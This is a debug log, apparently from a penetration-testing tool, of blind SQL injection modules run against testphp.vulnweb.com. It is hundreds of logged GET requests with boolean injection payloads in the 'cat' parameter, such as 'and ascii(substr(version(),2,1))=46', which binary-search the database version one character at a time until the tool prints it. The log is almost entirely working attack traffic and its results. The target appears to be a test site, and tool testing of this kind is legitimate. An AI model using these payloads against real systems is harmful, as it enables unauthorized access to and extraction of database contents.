2015-11-30 03:43:40,490 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),2,1)).
2015-11-30 03:43:40,490 DEBUG      Cookie: None.
2015-11-30 03:43:41,507 DEBUG      Time: 1.01700401306.
2015-11-30 03:43:41,508 DEBUG      Send GET request number 27 to testphp.vulnweb.com.
2015-11-30 03:43:41,508 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=31.
2015-11-30 03:43:41,508 DEBUG      Cookie: None.
2015-11-30 03:43:42,555 DEBUG      Time: 1.04703688622.
2015-11-30 03:43:42,556 DEBUG      Send GET request number 28 to testphp.vulnweb.com.
2015-11-30 03:43:42,556 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),2,1)).
2015-11-30 03:43:42,556 DEBUG      Cookie: None.
2015-11-30 03:43:43,608 DEBUG      Time: 1.0516898632.
2015-11-30 03:43:43,609 DEBUG      Send GET request number 29 to testphp.vulnweb.com.
2015-11-30 03:43:43,609 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=47.
2015-11-30 03:43:43,609 DEBUG      Cookie: None.
2015-11-30 03:43:44,629 DEBUG      Time: 1.01976513863.
2015-11-30 03:43:44,630 DEBUG      Send GET request number 30 to testphp.vulnweb.com.
2015-11-30 03:43:44,630 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 47<ascii(substr(version(),2,1)).
2015-11-30 03:43:44,630 DEBUG      Cookie: None.
2015-11-30 03:43:45,644 DEBUG      Time: 1.01378083229.
2015-11-30 03:43:45,645 DEBUG      Send GET request number 31 to testphp.vulnweb.com.
2015-11-30 03:43:45,645 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=39.
2015-11-30 03:43:45,645 DEBUG      Cookie: None.
2015-11-30 03:43:46,684 DEBUG      Time: 1.03887891769.
2015-11-30 03:43:46,685 DEBUG      Send GET request number 32 to testphp.vulnweb.com.
2015-11-30 03:43:46,685 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 39<ascii(substr(version(),2,1)).
2015-11-30 03:43:46,685 DEBUG      Cookie: None.
2015-11-30 03:43:47,731 DEBUG      Time: 1.04579091072.
2015-11-30 03:43:47,732 DEBUG      Send GET request number 33 to testphp.vulnweb.com.
2015-11-30 03:43:47,732 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=43.
2015-11-30 03:43:47,732 DEBUG      Cookie: None.
2015-11-30 03:43:48,737 DEBUG      Time: 1.00496506691.
2015-11-30 03:43:48,738 DEBUG      Send GET request number 34 to testphp.vulnweb.com.
2015-11-30 03:43:48,738 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 43<ascii(substr(version(),2,1)).
2015-11-30 03:43:48,739 DEBUG      Cookie: None.
2015-11-30 03:43:49,791 DEBUG      Time: 1.05239486694.
2015-11-30 03:43:49,792 DEBUG      Send GET request number 35 to testphp.vulnweb.com.
2015-11-30 03:43:49,792 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=45.
2015-11-30 03:43:49,792 DEBUG      Cookie: None.
2015-11-30 03:43:50,809 DEBUG      Time: 1.01698088646.
2015-11-30 03:43:50,810 DEBUG      Send GET request number 36 to testphp.vulnweb.com.
2015-11-30 03:43:50,810 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 45<ascii(substr(version(),2,1)).
2015-11-30 03:43:50,811 DEBUG      Cookie: None.
2015-11-30 03:43:51,835 DEBUG      Time: 1.02445101738.
2015-11-30 03:43:51,837 DEBUG      Send GET request number 37 to testphp.vulnweb.com.
2015-11-30 03:43:51,838 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=46.
2015-11-30 03:43:51,838 DEBUG      Cookie: None.
2015-11-30 03:43:52,233 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:44:46,639 DEBUG      Set Logging mode is True.
2015-11-30 03:44:46,639 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:44:46,643 DEBUG      Loading module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:44:46,643 DEBUG      Set URL to http://testphp.vulnweb.com/listproducts.php?cat=1*.
2015-11-30 03:44:46,643 DEBUG      Set PATTERN to Lorem ipsum dolor.
2015-11-30 03:44:46,643 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:44:46,644 DEBUG      URL include http/https, don`t need add prefix.
2015-11-30 03:44:46,644 DEBUG      Found 1 inject point in URL
2015-11-30 03:44:46,644 DEBUG      Set inject point to: URL
2015-11-30 03:44:46,644 WARNING    Inject point is ready.
2015-11-30 03:44:46,644 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:44:46,644 INFO       Get MySQL version
2015-11-30 03:44:46,644 INFO       Run query: version()
2015-11-30 03:44:46,649 DEBUG      Send GET request number 1 to testphp.vulnweb.com.
2015-11-30 03:44:46,649 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=127.
2015-11-30 03:44:46,649 DEBUG      Cookie: None.
2015-11-30 03:44:47,677 DEBUG      Time: 1.02765202522.
2015-11-30 03:44:47,678 DEBUG      Send GET request number 2 to testphp.vulnweb.com.
2015-11-30 03:44:47,678 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<length(version()).
2015-11-30 03:44:47,678 DEBUG      Cookie: None.
2015-11-30 03:44:48,693 DEBUG      Time: 1.01414299011.
2015-11-30 03:44:48,694 DEBUG      Send GET request number 3 to testphp.vulnweb.com.
2015-11-30 03:44:48,694 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=63.
2015-11-30 03:44:48,694 DEBUG      Cookie: None.
2015-11-30 03:44:49,742 DEBUG      Time: 1.04806494713.
2015-11-30 03:44:49,743 DEBUG      Send GET request number 4 to testphp.vulnweb.com.
2015-11-30 03:44:49,743 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<length(version()).
2015-11-30 03:44:49,743 DEBUG      Cookie: None.
2015-11-30 03:44:50,758 DEBUG      Time: 1.01441311836.
2015-11-30 03:44:50,759 DEBUG      Send GET request number 5 to testphp.vulnweb.com.
2015-11-30 03:44:50,759 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=31.
2015-11-30 03:44:50,759 DEBUG      Cookie: None.
2015-11-30 03:44:51,773 DEBUG      Time: 1.01440405846.
2015-11-30 03:44:51,776 DEBUG      Send GET request number 6 to testphp.vulnweb.com.
2015-11-30 03:44:51,776 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<length(version()).
2015-11-30 03:44:51,776 DEBUG      Cookie: None.
2015-11-30 03:44:52,784 DEBUG      Time: 1.0070681572.
2015-11-30 03:44:52,784 DEBUG      Send GET request number 7 to testphp.vulnweb.com.
2015-11-30 03:44:52,785 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=15.
2015-11-30 03:44:52,785 DEBUG      Cookie: None.
2015-11-30 03:44:53,811 DEBUG      Time: 1.02605605125.
2015-11-30 03:44:53,812 DEBUG      Send GET request number 8 to testphp.vulnweb.com.
2015-11-30 03:44:53,812 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 15<length(version()).
2015-11-30 03:44:53,812 DEBUG      Cookie: None.
2015-11-30 03:44:54,826 DEBUG      Time: 1.01383495331.
2015-11-30 03:44:54,827 DEBUG      Send GET request number 9 to testphp.vulnweb.com.
2015-11-30 03:44:54,827 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and length(version())=23.
2015-11-30 03:44:54,827 DEBUG      Cookie: None.
2015-11-30 03:44:55,882 DEBUG      Time: 1.05476117134.
2015-11-30 03:44:55,883 INFO       Result length: 23
2015-11-30 03:44:55,883 DEBUG      Send GET request number 10 to testphp.vulnweb.com.
2015-11-30 03:44:55,883 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=127.
2015-11-30 03:44:55,884 DEBUG      Cookie: None.
2015-11-30 03:44:56,886 DEBUG      Time: 1.0026550293.
2015-11-30 03:44:56,889 DEBUG      Send GET request number 11 to testphp.vulnweb.com.
2015-11-30 03:44:56,889 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),1,1)).
2015-11-30 03:44:56,889 DEBUG      Cookie: None.
2015-11-30 03:44:57,905 DEBUG      Time: 1.01575398445.
2015-11-30 03:44:57,906 DEBUG      Send GET request number 12 to testphp.vulnweb.com.
2015-11-30 03:44:57,906 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=63.
2015-11-30 03:44:57,906 DEBUG      Cookie: None.
2015-11-30 03:44:58,926 DEBUG      Time: 1.02000379562.
2015-11-30 03:44:58,927 DEBUG      Send GET request number 13 to testphp.vulnweb.com.
2015-11-30 03:44:58,927 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),1,1)).
2015-11-30 03:44:58,928 DEBUG      Cookie: None.
2015-11-30 03:44:59,922 DEBUG      Time: 0.994112014771.
2015-11-30 03:44:59,923 DEBUG      Send GET request number 14 to testphp.vulnweb.com.
2015-11-30 03:44:59,923 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=31.
2015-11-30 03:44:59,923 DEBUG      Cookie: None.
2015-11-30 03:45:00,929 DEBUG      Time: 1.00578999519.
2015-11-30 03:45:00,930 DEBUG      Send GET request number 15 to testphp.vulnweb.com.
2015-11-30 03:45:00,930 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),1,1)).
2015-11-30 03:45:00,930 DEBUG      Cookie: None.
2015-11-30 03:45:01,932 DEBUG      Time: 1.00124812126.
2015-11-30 03:45:01,934 DEBUG      Send GET request number 16 to testphp.vulnweb.com.
2015-11-30 03:45:01,934 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=47.
2015-11-30 03:45:01,934 DEBUG      Cookie: None.
2015-11-30 03:45:02,982 DEBUG      Time: 1.04779601097.
2015-11-30 03:45:02,983 DEBUG      Send GET request number 17 to testphp.vulnweb.com.
2015-11-30 03:45:02,983 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 47<ascii(substr(version(),1,1)).
2015-11-30 03:45:02,983 DEBUG      Cookie: None.
2015-11-30 03:45:04,004 DEBUG      Time: 1.0205681324.
2015-11-30 03:45:04,004 DEBUG      Send GET request number 18 to testphp.vulnweb.com.
2015-11-30 03:45:04,005 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=55.
2015-11-30 03:45:04,005 DEBUG      Cookie: None.
2015-11-30 03:45:05,000 DEBUG      Time: 0.994776010513.
2015-11-30 03:45:05,000 DEBUG      Send GET request number 19 to testphp.vulnweb.com.
2015-11-30 03:45:05,001 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 55<ascii(substr(version(),1,1)).
2015-11-30 03:45:05,001 DEBUG      Cookie: None.
2015-11-30 03:45:06,008 DEBUG      Time: 1.00746583939.
2015-11-30 03:45:06,009 DEBUG      Send GET request number 20 to testphp.vulnweb.com.
2015-11-30 03:45:06,009 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=51.
2015-11-30 03:45:06,009 DEBUG      Cookie: None.
2015-11-30 03:45:07,031 DEBUG      Time: 1.02142596245.
2015-11-30 03:45:07,032 DEBUG      Send GET request number 21 to testphp.vulnweb.com.
2015-11-30 03:45:07,032 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 51<ascii(substr(version(),1,1)).
2015-11-30 03:45:07,032 DEBUG      Cookie: None.
2015-11-30 03:45:08,047 DEBUG      Time: 1.01457309723.
2015-11-30 03:45:08,048 DEBUG      Send GET request number 22 to testphp.vulnweb.com.
2015-11-30 03:45:08,048 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),1,1))=53.
2015-11-30 03:45:08,048 DEBUG      Cookie: None.
2015-11-30 03:45:09,087 DEBUG      Time: 1.03891301155.
2015-11-30 03:45:09,088 INFO       Found character number 1 is: 5.
2015-11-30 03:45:09,088 DEBUG      Send GET request number 23 to testphp.vulnweb.com.
2015-11-30 03:45:09,089 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=127.
2015-11-30 03:45:09,089 DEBUG      Cookie: None.
2015-11-30 03:45:10,126 DEBUG      Time: 1.03731608391.
2015-11-30 03:45:10,127 DEBUG      Send GET request number 24 to testphp.vulnweb.com.
2015-11-30 03:45:10,127 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),2,1)).
2015-11-30 03:45:10,127 DEBUG      Cookie: None.
2015-11-30 03:45:11,144 DEBUG      Time: 1.01666903496.
2015-11-30 03:45:11,145 DEBUG      Send GET request number 25 to testphp.vulnweb.com.
2015-11-30 03:45:11,145 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=63.
2015-11-30 03:45:11,145 DEBUG      Cookie: None.
2015-11-30 03:45:12,166 DEBUG      Time: 1.02090907097.
2015-11-30 03:45:12,168 DEBUG      Send GET request number 26 to testphp.vulnweb.com.
2015-11-30 03:45:12,168 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),2,1)).
2015-11-30 03:45:12,168 DEBUG      Cookie: None.
2015-11-30 03:45:13,175 DEBUG      Time: 1.00593614578.
2015-11-30 03:45:13,175 DEBUG      Send GET request number 27 to testphp.vulnweb.com.
2015-11-30 03:45:13,176 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=31.
2015-11-30 03:45:13,176 DEBUG      Cookie: None.
2015-11-30 03:45:14,228 DEBUG      Time: 1.05233407021.
2015-11-30 03:45:14,229 DEBUG      Send GET request number 28 to testphp.vulnweb.com.
2015-11-30 03:45:14,229 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),2,1)).
2015-11-30 03:45:14,229 DEBUG      Cookie: None.
2015-11-30 03:45:15,237 DEBUG      Time: 1.00723814964.
2015-11-30 03:45:15,238 DEBUG      Send GET request number 29 to testphp.vulnweb.com.
2015-11-30 03:45:15,238 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=47.
2015-11-30 03:45:15,238 DEBUG      Cookie: None.
2015-11-30 03:45:16,253 DEBUG      Time: 1.01506090164.
2015-11-30 03:45:16,254 DEBUG      Send GET request number 30 to testphp.vulnweb.com.
2015-11-30 03:45:16,254 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 47<ascii(substr(version(),2,1)).
2015-11-30 03:45:16,254 DEBUG      Cookie: None.
2015-11-30 03:45:17,310 DEBUG      Time: 1.05529904366.
2015-11-30 03:45:17,311 DEBUG      Send GET request number 31 to testphp.vulnweb.com.
2015-11-30 03:45:17,312 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=39.
2015-11-30 03:45:17,312 DEBUG      Cookie: None.
2015-11-30 03:45:18,340 DEBUG      Time: 1.02842903137.
2015-11-30 03:45:18,341 DEBUG      Send GET request number 32 to testphp.vulnweb.com.
2015-11-30 03:45:18,341 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 39<ascii(substr(version(),2,1)).
2015-11-30 03:45:18,341 DEBUG      Cookie: None.
2015-11-30 03:45:19,335 DEBUG      Time: 0.993366956711.
2015-11-30 03:45:19,336 DEBUG      Send GET request number 33 to testphp.vulnweb.com.
2015-11-30 03:45:19,336 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=43.
2015-11-30 03:45:19,336 DEBUG      Cookie: None.
2015-11-30 03:45:20,358 DEBUG      Time: 1.02152204514.
2015-11-30 03:45:20,359 DEBUG      Send GET request number 34 to testphp.vulnweb.com.
2015-11-30 03:45:20,359 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 43<ascii(substr(version(),2,1)).
2015-11-30 03:45:20,359 DEBUG      Cookie: None.
2015-11-30 03:45:21,367 DEBUG      Time: 1.0079870224.
2015-11-30 03:45:21,368 DEBUG      Send GET request number 35 to testphp.vulnweb.com.
2015-11-30 03:45:21,368 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=45.
2015-11-30 03:45:21,368 DEBUG      Cookie: None.
2015-11-30 03:45:22,374 DEBUG      Time: 1.00505399704.
2015-11-30 03:45:22,376 DEBUG      Send GET request number 36 to testphp.vulnweb.com.
2015-11-30 03:45:22,376 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 45<ascii(substr(version(),2,1)).
2015-11-30 03:45:22,376 DEBUG      Cookie: None.
2015-11-30 03:45:23,429 DEBUG      Time: 1.05248904228.
2015-11-30 03:45:23,430 DEBUG      Send GET request number 37 to testphp.vulnweb.com.
2015-11-30 03:45:23,430 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),2,1))=46.
2015-11-30 03:45:23,430 DEBUG      Cookie: None.
2015-11-30 03:45:24,458 DEBUG      Time: 1.02737402916.
2015-11-30 03:45:24,458 INFO       Found character number 2 is: ..
2015-11-30 03:45:24,459 DEBUG      Send GET request number 38 to testphp.vulnweb.com.
2015-11-30 03:45:24,459 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),3,1))=127.
2015-11-30 03:45:24,459 DEBUG      Cookie: None.
2015-11-30 03:45:25,486 DEBUG      Time: 1.02612805367.
2015-11-30 03:45:25,486 DEBUG      Send GET request number 39 to testphp.vulnweb.com.
2015-11-30 03:45:25,487 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 127<ascii(substr(version(),3,1)).
2015-11-30 03:45:25,487 DEBUG      Cookie: None.
2015-11-30 03:45:26,534 DEBUG      Time: 1.04718995094.
2015-11-30 03:45:26,535 DEBUG      Send GET request number 40 to testphp.vulnweb.com.
2015-11-30 03:45:26,535 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),3,1))=63.
2015-11-30 03:45:26,535 DEBUG      Cookie: None.
2015-11-30 03:45:27,576 DEBUG      Time: 1.04058814049.
2015-11-30 03:45:27,578 DEBUG      Send GET request number 41 to testphp.vulnweb.com.
2015-11-30 03:45:27,578 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 63<ascii(substr(version(),3,1)).
2015-11-30 03:45:27,578 DEBUG      Cookie: None.
2015-11-30 03:45:28,596 DEBUG      Time: 1.0176551342.
2015-11-30 03:45:28,597 DEBUG      Send GET request number 42 to testphp.vulnweb.com.
2015-11-30 03:45:28,597 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),3,1))=31.
2015-11-30 03:45:28,597 DEBUG      Cookie: None.
2015-11-30 03:45:29,610 DEBUG      Time: 1.01328611374.
2015-11-30 03:45:29,611 DEBUG      Send GET request number 43 to testphp.vulnweb.com.
2015-11-30 03:45:29,611 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and 31<ascii(substr(version(),3,1)).
2015-11-30 03:45:29,612 DEBUG      Cookie: None.
2015-11-30 03:45:30,632 DEBUG      Time: 1.01997494698.
2015-11-30 03:45:30,632 DEBUG      Send GET request number 44 to testphp.vulnweb.com.
2015-11-30 03:45:30,633 DEBUG      URL: http://testphp.vulnweb.com/listproducts.php?cat=1 and ascii(substr(version(),3,1))=47.
2015-11-30 03:45:30,633 DEBUG      Cookie: None.
2015-11-30 03:45:30,985 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 03:45:47,504 INFO       Try to load: blind_sql_injection_binary_search.
2015-11-30 03:45:47,508 WARNING    Inject point is ready.
2015-11-30 03:45:47,508 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 03:45:47,508 INFO       Get MySQL version
2015-11-30 03:45:47,508 INFO       Run query: version()
2015-11-30 03:45:56,711 INFO       Result length: 23
2015-11-30 03:46:10,126 INFO       Found character number 1 is: 5
2015-11-30 03:46:25,447 INFO       Found character number 2 is: .
2015-11-30 03:46:38,816 INFO       Found character number 3 is: 1
2015-11-30 03:46:54,185 INFO       Found character number 4 is: .
2015-11-30 03:47:03,496 INFO       Found character number 5 is: 7
2015-11-30 03:47:14,759 INFO       Found character number 6 is: 3
2015-11-30 03:47:28,142 INFO       Found character number 7 is: -
2015-11-30 03:47:43,538 INFO       Found character number 8 is: 0
2015-11-30 03:47:56,877 INFO       Found character number 9 is: u
2015-11-30 03:48:12,434 INFO       Found character number 10 is: b
2015-11-30 03:48:25,825 INFO       Found character number 11 is: u
2015-11-30 03:48:41,234 INFO       Found character number 12 is: n
2015-11-30 03:48:56,679 INFO       Found character number 13 is: t
2015-11-30 03:49:09,980 INFO       Found character number 14 is: u
2015-11-30 03:49:25,328 INFO       Found character number 15 is: 0
2015-11-30 03:49:40,758 INFO       Found character number 16 is: .
2015-11-30 03:49:54,129 INFO       Found character number 17 is: 1
2015-11-30 03:50:09,618 INFO       Found character number 18 is: 0
2015-11-30 03:50:24,917 INFO       Found character number 19 is: .
2015-11-30 03:50:40,302 INFO       Found character number 20 is: 0
2015-11-30 03:50:55,679 INFO       Found character number 21 is: 4
2015-11-30 03:51:11,086 INFO       Found character number 22 is: .
2015-11-30 03:51:24,405 INFO       Found character number 23 is: 1
2015-11-30 03:51:24,405 INFO       Result: 5.1.73-0ubuntu0.10.04.1
2015-11-30 03:51:24,406 WARNING    Send 328 request.
2015-11-30 03:51:24,406 INFO       Finish load module: exploit/sql_injection/blind_sql_injection_binary_search.
2015-11-30 04:17:42,554 INFO       Try to load: blind_sql_injection.
2015-11-30 04:17:42,554 WARNING    Inject point is ready.
2015-11-30 04:17:42,555 WARNING    Started Module: Blind SQL injection Module.
2015-11-30 04:17:42,555 INFO       Get MySQL version
2015-11-30 04:17:42,555 INFO       Run query: version()
2015-11-30 04:18:07,254 INFO       Result length: 23
2015-11-30 04:18:13,432 INFO       Found character number 1 is: 5.
2015-11-30 04:19:31,480 INFO       Found character number 2 is: ..
2015-11-30 04:19:33,583 INFO       Found character number 3 is: 1.
2015-11-30 04:20:51,697 INFO       Found character number 4 is: ..
2015-11-30 04:20:59,876 INFO       Found character number 5 is: 7.
2015-11-30 04:21:03,999 INFO       Found character number 6 is: 3.
2015-11-30 04:22:20,656 INFO       Found character number 7 is: -.
2015-11-30 04:22:21,711 INFO       Found character number 8 is: 0.
2015-11-30 04:22:53,454 INFO       Found character number 9 is: u.
2015-11-30 04:23:05,697 INFO       Found character number 10 is: b.
2015-11-30 04:23:37,582 INFO       Found character number 11 is: u.
2015-11-30 04:24:02,275 INFO       Found character number 12 is: n.
2015-11-30 04:24:33,130 INFO       Found character number 13 is: t.
2015-11-30 04:25:04,929 INFO       Found character number 14 is: u.
2015-11-30 04:25:05,957 INFO       Found character number 15 is: 0.
2015-11-30 04:26:23,996 INFO       Found character number 16 is: ..
2015-11-30 04:26:26,028 INFO       Found character number 17 is: 1.
2015-11-30 04:26:27,047 INFO       Found character number 18 is: 0.
2015-11-30 04:27:45,124 INFO       Found character number 19 is: ..
2015-11-30 04:27:46,151 INFO       Found character number 20 is: 0.
2015-11-30 04:27:51,237 INFO       Found character number 21 is: 4.
2015-11-30 04:29:08,963 INFO       Found character number 22 is: ..
2015-11-30 04:29:11,053 INFO       Found character number 23 is: 1.
2015-11-30 04:29:11,054 INFO       Result: 5.1.73-0ubuntu0.10.04.1
2015-11-30 04:29:11,054 WARNING    Send 671 request.
2015-11-30 04:29:11,054 INFO       Finish load module: exploit/sql_injection/blind_sql_injection.
